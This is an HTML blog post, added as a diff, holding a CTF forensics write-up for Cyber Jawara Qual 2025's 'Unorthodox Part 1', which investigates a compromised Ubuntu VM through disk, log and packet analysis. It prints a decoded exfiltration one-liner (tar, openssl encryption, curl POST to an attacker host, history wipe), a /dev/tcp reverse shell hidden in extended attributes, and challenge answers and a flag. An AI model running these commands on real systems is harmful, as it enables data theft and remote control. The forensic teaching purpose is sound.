@@ -1,0 +1,472 @@
+<!doctype html>
+<html lang="en" data-theme="light">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Unorthodox Part 1 – Cyber Jawara Qual 2025 | Jay's Cybersecurity Notes</title>
+    <link rel="stylesheet" href="/assets/main.css">
+    <link rel="stylesheet" href="/assets/css/custom.css">
+  </head>
+  <body>
+    <header class="site-header">
+      <div class="wrapper header-inner">
+        <button class="nav-toggle" type="button" aria-label="Toggle navigation" aria-expanded="false" aria-controls="primary-nav">
+          <span class="nav-toggle-bars">
+            <span></span><span></span><span></span>
+          </span>
+        </button>
+        <a class="brand" href="/">
+          <span class="brand-dot"></span>
+          Jay's Cybersecurity Notes
+        </a>
+        <nav id="primary-nav" class="nav-links" aria-label="Primary">
+          <a href="/">Home</a>
+          <a href="/tags/">Tags</a>
+          <a href="/about/">About</a>
+          <div class="nav-icons">
+            <a class="icon-btn" href="https://github.com/Jaysenlestari" target="_blank" rel="noopener" aria-label="GitHub: Jaysenlestari">
+              <span aria-hidden="true" class="icon github-icon">
+                <svg viewBox="0 0 24 24" role="presentation">
+                  <path d="M12 .5C5.648.5.5 5.74.5 12.207c0 5.181 3.438 9.576 8.207 11.125.6.116.82-.27.82-.6 0-.297-.011-1.082-.017-2.124-3.338.744-4.042-1.645-4.042-1.645-.546-1.402-1.333-1.775-1.333-1.775-1.089-.767.083-.751.083-.751 1.205.087 1.838 1.27 1.838 1.27 1.07 1.866 2.809 1.327 3.494 1.015.108-.787.419-1.327.762-1.632-2.665-.313-5.466-1.378-5.466-6.135 0-1.356.465-2.463 1.235-3.33-.124-.314-.535-1.574.117-3.281 0 0 1.008-.329 3.302 1.27a11.29 11.29 0 0 1 3.008-.415c1.02.005 2.047.142 3.007.415 2.294-1.599 3.3-1.27 3.3-1.27.653 1.707.242 2.967.118 3.28.77.868 1.233 1.975 1.233 3.331 0 4.77-2.806 5.818-5.48 6.125.43.382.814 1.136.814 2.29 0 1.654-.015 2.986-.015 3.392 0 .333.217.72.826.597 4.766-1.55 8.201-5.944 8.201-11.123C23.5 5.74 18.353.5 12 .5Z"/>
+                </svg>
+              </span>
+            </a>
+            <a class="icon-btn" href="https://discord.com/users/655627264180092948" target="_blank" rel="noopener" aria-label="Discord: jaysen_lestari">
+              <span aria-hidden="true" class="icon discord-icon">
+                <svg viewBox="0 0 24 24" role="presentation">
+                  <path d="M20.317 4.369a19.78 19.78 0 0 0-4.885-1.515.07.07 0 0 0-.075.035c-.211.375-.444.864-.608 1.249a18.27 18.27 0 0 0-5.448 0 12.64 12.64 0 0 0-.617-1.25.07.07 0 0 0-.075-.035 19.736 19.736 0 0 0-4.885 1.516.064.064 0 0 0-.03.025C2.175 9.033 1.64 13.6 2.066 18.111a.077.077 0 0 0 .031.054c2.052 1.505 4.038 2.422 5.993 3.029a.07.07 0 0 0 .076-.027c.461-.632.873-1.3 1.226-2.006a.07.07 0 0 0-.041-.097 13.1 13.1 0 0 1-1.872-.898.07.07 0 0 1-.007-.117c.126-.094.252-.192.372-.29a.07.07 0 0 1 .073-.01c3.928 1.793 8.18 1.793 12.062 0a.07.07 0 0 1 .074.01c.12.098.246.196.373.29a.07.07 0 0 1-.006.118 12.3 12.3 0 0 1-1.873.897.07.07 0 0 0-.04.098 14.3 14.3 0 0 0 1.225 2.005.07.07 0 0 0 .077.028c1.957-.607 3.943-1.524 5.994-3.029a.07.07 0 0 0 .03-.053c.5-5.177-.838-9.713-3.548-13.718a.061.061 0 0 0-.03-.025ZM8.68 15.331c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.175 1.096 2.157 2.419 0 1.334-.956 2.419-2.157 2.419Zm6.64 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.175 1.096 2.157 2.419 0 1.334-.947 2.419-2.157 2.419Z"/>
+                </svg>
+              </span>
+            </a>
+            <button id="theme-toggle" class="theme-toggle" type="button" aria-label="Toggle theme">
+              <span aria-hidden="true" class="icon icon-sun">
+                <svg viewBox="0 0 24 24" role="presentation">
+                  <path d="M12 4.5a1 1 0 0 1-1-1V2a1 1 0 1 1 2 0v1.5a1 1 0 0 1-1 1Zm0 17a1 1 0 0 1-1-1V19a1 1 0 1 1 2 0v1.5a1 1 0 0 1-1 1ZM4.5 12a1 1 0 0 1-1-1H2a1 1 0 1 1 0-2h1.5a1 1 0 0 1 0 2Zm17 0a1 1 0 0 1-1-1H21a1 1 0 1 1 0-2h-1.5a1 1 0 0 1 0 2ZM6.343 6.343a1 1 0 0 1-.707-1.707l1.06-1.06a1 1 0 0 1 1.414 1.414l-1.06 1.06a1 1 0 0 1-.707.293Zm10.606 10.607a1 1 0 0 1-.707-1.707l1.06-1.06a1 1 0 0 1 1.415 1.414l-1.061 1.06a1 1 0 0 1-.707.293Zm1.768-10.607a1 1 0 0 1-.707-.293l-1.06-1.06A1 1 0 0 1 18.364 3.576l1.06 1.06a1 1 0 0 1-.707 1.415ZM6.343 17.657a1 1 0 0 1-.707-.293l-1.06-1.06a1 1 0 0 1 1.414-1.415l1.06 1.06a1 1 0 0 1-.707 1.708ZM12 7.25A4.75 4.75 0 1 0 12 16.75 4.75 4.75 0 0 0 12 7.25Z"/>
+                </svg>
+              </span>
+              <span aria-hidden="true" class="icon icon-moon" hidden>
+                <svg viewBox="0 0 24 24" role="presentation">
+                  <path d="M20.752 14.318a8.5 8.5 0 0 1-11.07-11.07 1 1 0 0 0-1.32-1.32A10.5 10.5 0 1 0 21.89 15.64a1 1 0 0 0-1.138-1.322Z"/>
+                </svg>
+              </span>
+            </button>
+          </div>
+        </nav>
+      </div>
+    </header>
+
+    <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post">
+  <div class="post-shell">
+    <div class="post-main">
+      <p class="post-meta-line">
+        <span>Jan 17, 2026</span>
+        
+          <span class="dot" aria-hidden="true">&bull;</span>
+          <span class="caps">CTF | Forensics | DFIR</span>
+        
+      </p>
+
+      <h1 class="post-title">Unorthodox Part 1 – Cyber Jawara Qual 2025</h1>
+
+      
+        <div class="tag-row">
+          
+            <span class="tag-chip">DigitalForensics</span>
+          
+            <span class="tag-chip">DiskForensics</span>
+          
+            <span class="tag-chip">Linux</span>
+          
+            <span class="tag-chip">xattr</span>
+          
+            <span class="tag-chip">Persistence</span>
+          
+            <span class="tag-chip">PCAP</span>
+          
+        </div>
+      
+
+      <div class="post-body">
+        <p>On December 27th, I participated in the Cyber Jawara 2025 Qualifiers with my team, manablokchennya-Xx and we qualified to the final stage, where one of the forensic challenges I manage to solved was “Unorthodox - Part 1.”.</p>
+
+<p>Unorthodox – Part 1 stood out as a particularly interesting challenge due to its realistic investigation flow, especially in the later stage where the attacker leveraged <strong>less common persistence techniques</strong>. Instead of relying on obvious indicators of compromise, the challenge required careful review of package installation logs and extended file attributes to uncover a stealthy payload hidden using <strong>xattr</strong>, which was planted months before the actual data exfiltration took place.</p>
+
+<p>In this post, I will present a complete forensic write-up of the challenge, detailing each step of the investigation — from mounting the compromised virtual machine and validating credential integrity, to uncovering hidden persistence mechanisms, decrypting exfiltrated data, and identifying multiple internal threat actors operating within the environment.</p>
+
+<p>You can access the challange attachments <a href="https://github.com/sksd-id/CJ2025-public/tree/main/quals/umum/Forensics/Unorthodox%20Part%201">here</a></p>
+
+<h2 id="unorthodox-part-1">Unorthodox Part 1</h2>
+
+<h3 id="attachment">Attachment</h3>
+<ul>
+  <li>artifact.zip</li>
+</ul>
+
+<h3 id="description">Description</h3>
+<p>Our client has suffered a critical internal breach. All the details can be found in CJ-UNORTHODOX-CASE-1.pdf file. You need to answer all the tasks correctly in the remote connection. There are 8 Questions for you to answer. All of the necessary artifacts including the document can be downloaded from the following zip file: https://drive.google.com/file/d/1rJk2hWxTV8jGLkAOdKPGAyBHPxNB67a2/view?usp=sharing 
+Zip password = CJ2025{65e8d2d5563d202ff4d6269e08748f9e24854eb6374670851fe1542ebecf739c}</p>
+
+<p>NOTE: The malicious artifact doesn’t encrypt/modify your files, don’t worry. You can trust me ^-^ Start challenge from: https://gzcli.ctf.cyberjawara.id/umum-quals-forensics-unorthodox-part-1</p>
+
+<h3 id="initial-case-analysis">Initial Case Analysis</h3>
+<p>This case provided four files :</p>
+<ul>
+  <li>CJ-UNORTHODOX-CASE-1.pdf</li>
+  <li>PCAP_Captured.pcap</li>
+  <li>CoreStock.ova</li>
+  <li>exfiltrated.bin</li>
+</ul>
+
+<p>From the PDF, we learn that the attacker caused three main impacts:</p>
+<ol>
+  <li>All recent stock macro-analysis data was deleted</li>
+  <li>All user login credentials were changed</li>
+  <li>The server may have been compromised by multiple internal threat actors</li>
+</ol>
+
+<p>Since the virtual machine might still contain useful evidence, I started by analyzing the <code class="language-plaintext highlighter-rouge">CoreStock.ova</code> file.</p>
+
+<h3 id="mounting-the-compromised-virtual-machine">Mounting the Compromised Virtual Machine</h3>
+<p>An OVA is basically a packaged virtual machine, so I extracted it and obtained the main disk file: <code class="language-plaintext highlighter-rouge">CoreStock-disk002.vmdk</code>. To mount this VMDK and access the filesystem, I followed the method described <a href="https://jasonmurray.org/posts/2021/mountvmdk/">here</a>.</p>
+<ol>
+  <li>Load the NBD kernel module
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>modprobe nbd <span class="nv">max_part</span><span class="o">=</span>8
+</code></pre></div>    </div>
+  </li>
+  <li>Attach the VMDK to /dev/nbd0 (read-only)
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>qemu-nbd <span class="nt">--read-only</span> <span class="nt">--connect</span><span class="o">=</span>/dev/nbd0 CoreStock-disk002.vmdk
+</code></pre></div>    </div>
+  </li>
+  <li>Check the partition layout
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>fdisk <span class="nt">-l</span> /dev/nbd0
+</code></pre></div>    </div>
+    <p><img src="/assets/CJ-Qual/1.png" alt="alt text" />
+From this output I identified:</p>
+    <ul>
+      <li>/dev/nbd0p2 → ext4 partition (~2GB) → this is the /boot partition</li>
+      <li>/dev/nbd0p3 → LVM physical volume (~23GB) → this contains the main OS filesystem
+So the actual Linux system is stored inside LVM on partition p3.</li>
+    </ul>
+  </li>
+  <li>Detect and activate the LVM volumes
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>pvscan
+<span class="nb">sudo </span>vgscan
+<span class="nb">sudo </span>vgchange <span class="nt">-ay</span>
+<span class="nb">sudo </span>lvs
+</code></pre></div>    </div>
+    <p>This revealed a logical volume: /dev/ubuntu-vg/ubuntu-lv</p>
+  </li>
+  <li>Mount the root filesystem (read-only)
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>mount <span class="nt">-o</span> ro,noload /dev/ubuntu-vg/ubuntu-lv /mnt/un
+</code></pre></div>    </div>
+    <p>Using ro,noload ensures the filesystem journal is not replayed, so nothing on disk is modified. At this point, the full Linux filesystem became accessible at: /mnt/un	
+<img src="/assets/CJ-Qual/2.png" alt="alt text" /></p>
+  </li>
+</ol>
+
+<h3 id="question-and-analysis">Question and Analysis</h3>
+<p>Now we move on to the question.</p>
+<ol>
+  <li>Provide the current state SHA1 checksum of /etc/passwd and /etc/shadow files respectively.
+Format: hexpasswd:hexshadow (e.g., 01cde86aeee1f8e73f969bb34b8e0102b54f22f4:80514ef77a78c1edb97cf51a205627b2d6ec679d)
+We calculated the SHA1 checksum of both files directly from the mounted filesystem:
+<img src="/assets/CJ-Qual/3.png" alt="alt text" /></li>
+</ol>
+
+<p>Answer : 
+<code class="language-plaintext highlighter-rouge">b4e536869564e1b32dfd60ea90bc45227a289c3c:e9b3129a2209be30fb0ba6ceb61e5c0ee4e47c70</code></p>
+
+<ol>
+  <li>What’s the IP address of the internal threat actor (local) who’s responsible to exfiltrate a certain data to their controlled website/API endpoint? 
+Format: ipv4.ipv4.ipv4.ipv4 (e.g., 172.16.1.78)
+We analyzed the provided packet capture and inspected HTTP traffic. One suspicious HTTP POST request contained:
+    <ul>
+      <li>User-Agent: curl</li>
+      <li>Message Body: Berhasil :p</li>
+    </ul>
+  </li>
+</ol>
+
+<p>This strongly suggested command-line exfiltration activity.
+<img src="/assets/CJ-Qual/5.png" alt="alt text" /></p>
+
+<p>Answer : <code class="language-plaintext highlighter-rouge">192.168.100.107</code></p>
+
+<ol>
+  <li>What’s the path of the attacker controlled endpoint that receives the data? Note that the data doesn’t exist in the packet capture, but we’ve dissected and extracted it to the exfiltrated.bin file.
+Format: /path (e.g., /exfiltratedapi)
+A malicious script was discovered at: /home/cj/.ssh/rc.</li>
+</ol>
+
+<p>When opening the file, it did not immediately show readable code. Instead, it contained Base64-encoded and obfuscated shell syntax, for example:
+<img src="/assets/CJ-Qual/6.png" alt="alt text" />
+Breaking down the obfuscation :</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Obfuscated Part</th>
+      <th>Explanation</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">$'\u0073'</code></td>
+      <td>Unicode escape sequence representing the character <code class="language-plaintext highlighter-rouge">s</code></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">ba$'\u0073h'</code></td>
+      <td>Reconstructed at runtime to form the string <code class="language-plaintext highlighter-rouge">bash</code></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">${@,}</code> &amp; <code class="language-plaintext highlighter-rouge">${@%%…}</code></td>
+      <td>Dummy parameter expansions used to confuse analysis</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">&lt;&lt;&lt;</code></td>
+      <td>Here-string redirection for inline input</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>So we know : it run bash and feeds decoded base64 into it. To inspect the actual malicious command safely,
+we replaced the execution part with cat instead of bash
+<img src="/assets/CJ-Qual/7.png" alt="alt text" />
+<img src="/assets/CJ-Qual/8.png" alt="alt text" />
+This revealed the FULL malicious script:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"Haha your server is already pwned by Joko_S3mbunG."</span> |  <span class="nb">tar</span> <span class="nt">-czf</span> - <span class="nt">-C</span> /home/cj/core_app <span class="nb">.</span> | openssl enc <span class="nt">-aes-256-cbc</span> <span class="nt">-salt</span> <span class="nt">-pbkdf2</span> <span class="nt">-k</span> <span class="s1">'Ch4LLG48uT_h3h3!'</span> | curl <span class="nt">-X</span> POST <span class="nt">--data-binary</span> @- http://192.168.100.107/looters <span class="o">&amp;&amp;</span> <span class="nb">history</span> <span class="nt">-c</span>
+</code></pre></div></div>
+<p>So, we know that the data flow is : 
+/home/cj/core_app  -&gt;  tar  -&gt;  openssl encryption  -&gt;  curl POST  -&gt;  attacker server</p>
+
+<p>Answer : <code class="language-plaintext highlighter-rouge">looters</code></p>
+
+<ol>
+  <li>What’s the full absolute path of the targeted directory that the internal threat actor exfiltrates from?
+Format: /absolute/path (e.g., /opt/secret)</li>
+</ol>
+
+<p>From the malicious script we recovered in /home/cj/.ssh/rc. We previously decoded the payload and discovered the following command chain: tar -czf - -C /home/cj/core_app .</p>
+
+<p>Answer: <code class="language-plaintext highlighter-rouge">/home/cj/core_app</code></p>
+
+<ol>
+  <li>Where is the malicious exfiltrator script located? Please provide the full absolute path!
+During inspection of the compromised user account directory /home/cj/.ssh, we discovered rc, the file contains malicious encoded payload.</li>
+</ol>
+
+<p>Answer : <code class="language-plaintext highlighter-rouge">/home/cj/.ssh/rc</code></p>
+
+<ol>
+  <li>It looks like the exfiltrated directory files were all being shredded. Please provide the original metadata title of the web application (in layout.tsx file), the total of the stock sectors and the total of the companies!
+Format: Title Web App Name_totalstocksectors_totalcompanies (e.g., Cool Stock Website 2024 - Galapagos Stock_8_91)
+First, we extracting the exfiltrated encrypted payload and decrypting using the attacker’s AES key : Ch4LLG48uT_h3h3! and than extracting the web app source code
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">tar</span> <span class="nt">-czf</span> - <span class="nt">-C</span> /home/cj/core_app <span class="nb">.</span>
+| openssl enc <span class="nt">-aes-256-cbc</span> <span class="nt">-salt</span> <span class="nt">-pbkdf2</span> <span class="nt">-k</span> <span class="s1">'Ch4LLG48uT_h3h3!'</span>
+</code></pre></div>    </div>
+    <p>Inside /home/cj/core_app/company_secret/app/layout.tsx. We localted the metadata : 
+<img src="/assets/CJ-Qual/9.png" alt="alt text" />
+Counting Stock Sectors inside : lib/stock-data.ts
+<img src="/assets/CJ-Qual/10.png" alt="alt text" />
+total : 8</p>
+  </li>
+</ol>
+
+<p>Counting Company List inside the same file : 
+<img src="/assets/CJ-Qual/11.png" alt="alt text" />
+Total companies = 40</p>
+
+<p>Answer : <code class="language-plaintext highlighter-rouge">Saham Bos 2025 - Stock Market Dashboard_8_40</code></p>
+
+<ol>
+  <li>
+    <p>Please provide the original state of all the stock codes for Technology Sector-based Stock Code!
+Format: STCK,STCK,STCK,STCK (e.g., NUMA,POCK,RAVA,LEMA)
+From the same file lib/stock-data.ts, we filtered companies where sector==”Technology” and resulted :
+<img src="/assets/CJ-Qual/11.png" alt="alt text" />
+Answer : TECH,DIGI,CHIP,CLOUD,ELECT,DATA</p>
+  </li>
+  <li>
+    <p>Upon the investigation, we sought another potential threat actor compromising the machine from the different IP but we didn’t see any plain IOC in the server. It looks like this threat actor was first seen in November before the exfiltration event occurs whereas there has been an unauthorized dependency/package installation in the server which we haven’t validated yet. Are you able to find another IP of the attacker and its payload in base64 form?
+Format: ipv4.ipv4.ipv4.ipv4_base64encodedpayload (e.g., 172.16.1.18_ZWNobyAnW3tob3N0czogMTkuMjEzLjQ1LjE2LCB0YXNrczogW3NoZWxsOiAvYmluL3NoIDwvZGV2L3R0eSA+L2Rldi90dHkgMj4vZGV2L3R0eV19XScgPiAkR0FMQUs7IGFuc2libGUtcGxheWJvb2sgJEdBTEFL)</p>
+  </li>
+</ol>
+
+<p>While reviewing persistence artifacts, I noted <strong>a suspicious package installation in November</strong>, prior to the data exfiltration event: /mnt/ubuntu/var/log/dpkg.log
+<img src="/assets/CJ-Qual/12.png" alt="alt text" />
+The attr package is used to manipulate extended file attributes — commonly abused for stealth payload storage. (https://isc.sans.edu/diary/32116)</p>
+
+<p>We scanned /home/cj for hidden xattr metadata and found a <strong>payload embedded</strong> in: /home/cj/frmstarter.script
+<img src="/assets/CJ-Qual/13.png" alt="alt text" />
+Decoded payload : sh -i &gt;&amp; /dev/tcp/192.168.100.137/8281 0&gt;&amp;1</p>
+
+<p>This proves Attacker IP = 192.168.100.137
+Answer : <code class="language-plaintext highlighter-rouge">192.168.100.137_c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMDAuMTM3LzgyODEgMD4mMQ==</code></p>
+
+<p><img src="/assets/CJ-Qual/15.png" alt="alt text" /></p>
+
+<p>FLAG : 
+<code class="language-plaintext highlighter-rouge">CJ2025{13bf2db2271d235e2c33dc98d45482b1242df9333402f3e02ca83a9def15ac4b}</code></p>
+
+<p>This investigation highlights the importance of going beyond obvious indicators and examining less common persistence vectors. Correlating disk, log, and network artifacts ultimately revealed the complete attacker workflow.</p>
+
+      </div>
+    </div>
+
+    <aside id="post-toc" class="toc-card" aria-label="Table of contents"></aside>
+  </div>
+  <button id="toc-toggle" class="toc-toggle" type="button" aria-expanded="false" aria-controls="post-toc" aria-label="Toggle table of contents">
+    <svg viewBox="0 0 24 24" role="presentation">
+      <path d="M4 5.5c0-.55.45-1 1-1h14a1 1 0 1 1 0 2H5a1 1 0 0 1-1-1Zm0 6c0-.55.45-1 1-1h8a1 1 0 1 1 0 2H5a1 1 0 0 1-1-1Zm0 6c0-.55.45-1 1-1h14a1 1 0 1 1 0 2H5a1 1 0 0 1-1-1Z"/>
+    </svg>
+  </button>
+</article>
+<script>
+(function () {
+  const tocRoot = document.getElementById('post-toc');
+  const postBody = document.querySelector('.post-body');
+  if (!tocRoot || !postBody) return;
+
+  const headings = Array.from(postBody.querySelectorAll('h2, h3'));
+  if (headings.length === 0) { tocRoot.remove(); document.getElementById('toc-toggle')?.remove(); return; }
+
+  const rootList = document.createElement('ul');
+  rootList.className = 'toc-list';
+  const headingMap = new Map();
+  let currentH2Li = null;
+
+  headings.forEach((h, i) => {
+    if (!h.id) h.id = `section-${i + 1}`;
+    const li = document.createElement('li');
+    const a = document.createElement('a');
+    a.href = `#${h.id}`; a.textContent = h.textContent;
+
+    if (h.tagName === 'H2') {
+      li.className = 'toc-item';
+      li.appendChild(a);
+      rootList.appendChild(li);
+      currentH2Li = li;
+    } else if (h.tagName === 'H3' && currentH2Li) {
+      let sub = currentH2Li.querySelector('ul') || document.createElement('ul');
+      sub.className = 'toc-list depth-2';
+      const subLi = document.createElement('li');
+      subLi.className = 'toc-item depth-2';
+      subLi.appendChild(a);
+      sub.appendChild(subLi);
+      if (!currentH2Li.contains(sub)) currentH2Li.appendChild(sub);
+    }
+    headingMap.set(h.id, li);
+  });
+
+  tocRoot.innerHTML = '<div class="toc-title">Contents</div>';
+  tocRoot.appendChild(rootList);
+
+  const tocToggle = document.getElementById('toc-toggle');
+  if (tocToggle) {
+    tocToggle.addEventListener('click', (e) => {
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      const isOpened = tocRoot.classList.toggle('open');
+      document.body.classList.toggle('toc-open', isOpened);
+    });
+  }
+
+  // Scroll Spy
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        document.querySelectorAll('.toc-item.active').forEach(el => el.classList.remove('active'));
+        headingMap.get(entry.target.id)?.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-10% 0px -70% 0px' });
+  headings.forEach(h => observer.observe(h));
+
+  document.addEventListener('click', (e) => {
+    if (tocRoot.classList.contains('open') && !tocRoot.contains(e.target) && !tocToggle?.contains(e.target)) {
+      tocRoot.classList.remove('open');
+      document.body.classList.remove('toc-open');
+    }
+  });
+})();
+</script>
+
+      </div>
+    </main>
+
+    <footer class="site-footer">
+      <div class="wrapper footer-inner">
+        <div class="footer-note-left">&copy; 2026 Jay's Cybersecurity Notes.</div>
+      </div>
+    </footer>
+    <script>
+document.addEventListener('DOMContentLoaded', () => {
+  // 1. Theme Logic
+  const root = document.documentElement;
+  const themeBtn = document.getElementById('theme-toggle');
+  const sunIcon = '<svg viewBox="0 0 24 24" role="presentation"><path d="M12 4.5a1 1 0 0 1-1-1V2a1 1 0 1 1 2 0v1.5a1 1 0 0 1-1 1Zm0 17a1 1 0 0 1-1-1V19a1 1 0 1 1 2 0v1.5a1 1 0 0 1-1 1ZM4.5 12a1 1 0 0 1-1-1H2a1 1 0 1 1 0-2h1.5a1 1 0 0 1 0 2Zm17 0a1 1 0 0 1-1-1H21a1 1 0 1 1 0-2h-1.5a1 1 0 0 1 0 2ZM6.343 6.343a1 1 0 0 1-.707-1.707l1.06-1.06a1 1 0 0 1 1.414 1.414l-1.06 1.06a1 1 0 0 1-.707.293Zm10.606 10.607a1 1 0 0 1-.707-1.707l1.06-1.06a1 1 0 0 1 1.415 1.414l-1.061 1.06a1 1 0 0 1-.707.293Zm1.768-10.607a1 1 0 0 1-.707-.293l-1.06-1.06A1 1 0 0 1 18.364 3.576l1.06 1.06a1 1 0 0 1-.707 1.415ZM6.343 17.657a1 1 0 0 1-.707-.293l-1.06-1.06a1 1 0 0 1 1.414-1.415l1.06 1.06a1 1 0 0 1-.707 1.708ZM12 7.25A4.75 4.75 0 1 0 12 16.75 4.75 4.75 0 0 0 12 7.25Z"/></svg>';
+  const moonIcon = '<svg viewBox="0 0 24 24" role="presentation"><path d="M20.752 14.318a8.5 8.5 0 0 1-11.07-11.07 1 1 0 0 0-1.32-1.32A10.5 10.5 0 1 0 21.89 15.64a1 1 0 0 0-1.138-1.322Z"/></svg>';
+  const setTheme = (t) => {
+    root.dataset.theme = t;
+    localStorage.setItem('theme', t);
+    if (themeBtn) {
+      themeBtn.innerHTML = t === 'dark' ? sunIcon : moonIcon;
+      themeBtn.setAttribute('aria-label', t === 'dark' ? 'Switch to light mode' : 'Switch to dark mode');
+      themeBtn.setAttribute('title', t === 'dark' ? 'Switch to light mode' : 'Switch to dark mode');
+    }
+  };
+  const stored = localStorage.getItem('theme');
+  const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+  setTheme(stored || (prefersDark ? 'dark' : 'light'));
+  if (themeBtn) themeBtn.addEventListener('click', () => setTheme(root.dataset.theme === 'dark' ? 'light' : 'dark'));
+
+  // 2. Hamburger Logic (FIXED)
+  const toggle = document.querySelector('.nav-toggle');
+  const nav = document.getElementById('primary-nav');
+
+  if (toggle && nav) {
+    toggle.addEventListener('click', (e) => {
+      e.preventDefault();
+      e.stopImmediatePropagation(); // MATIKAN bubble biar ga lari ke document.click
+      
+      const isOpen = nav.classList.toggle('open');
+      toggle.classList.toggle('is-open', isOpen);
+      document.body.classList.toggle('nav-open', isOpen);
+
+    });
+  }
+
+  // 3. Global Click to Close
+  document.addEventListener('click', (e) => {
+    if (nav && nav.classList.contains('open') && !nav.contains(e.target) && !toggle.contains(e.target)) {
+      nav.classList.remove('open');
+      toggle.classList.remove('is-open');
+      document.body.classList.remove('nav-open');
+    }
+  });
+
+  // 4. Code Copy Button
+  const copyIcon = '<svg viewBox="0 0 24 24" role="presentation"><path d="M8 4a3 3 0 0 1 3-3h8a3 3 0 0 1 3 3v8a3 3 0 0 1-3 3h-1v3a3 3 0 0 1-3 3H4a3 3 0 0 1-3-3v-8a3 3 0 0 1 3-3h1V4Zm2 0v3h5a3 3 0 0 1 3 3v5h1a1 1 0 0 0 1-1V4a1 1 0 0 0-1-1h-8a1 1 0 0 0-1 1Zm-6 8v8a1 1 0 0 0 1 1h11a1 1 0 0 0 1-1v-8a1 1 0 0 0-1-1H5a1 1 0 0 0-1 1Z"/></svg>';
+  document.querySelectorAll('figure.highlight, div.highlight').forEach(block => {
+    const code = block.querySelector('pre code');
+    if (!code) return;
+    const btn = document.createElement('button');
+    btn.className = 'copy-btn'; btn.innerHTML = copyIcon;
+    btn.onclick = async () => {
+      await navigator.clipboard.writeText(code.innerText);
+      btn.classList.add('copied');
+      setTimeout(() => btn.classList.remove('copied'), 1500);
+    };
+    const actions = block.querySelector('.code-actions') || document.createElement('div');
+    actions.className = 'code-actions';
+    actions.appendChild(btn);
+    if (!block.querySelector('.code-actions')) block.appendChild(actions);
+  });
+});
+</script>
+      
+  </body>
+</html>
+
